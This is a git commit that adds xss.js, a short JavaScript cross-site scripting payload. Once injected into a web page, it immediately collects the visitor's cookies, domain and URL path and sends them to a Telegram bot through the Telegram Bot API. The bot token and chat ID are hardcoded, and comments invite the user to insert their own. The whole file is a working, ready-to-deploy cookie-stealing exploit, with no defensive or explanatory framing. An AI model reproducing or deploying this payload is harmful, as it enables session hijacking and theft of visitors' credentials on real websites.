89b55c87da6c9e74e8c4b6c3d782dd08737f4116
Syukirman Amir <128995740+syukirman-amir@users.noreply.github.com>
2024-04-27 12:07:19 +0900

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,10 @@
+var tokenBot = '7043468421:AAELoNUXP7iQ2ShMBCC7zr6fbmJavy8yQP0'; // Your "tokenBot" Here
+var chatId = '480631913'; // Your "chatId" Here
+
+function telegramSend(tokenBot, chatId) {
+	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
+    xhr.send();
+}
+telegramSend(tokenBot, chatId)
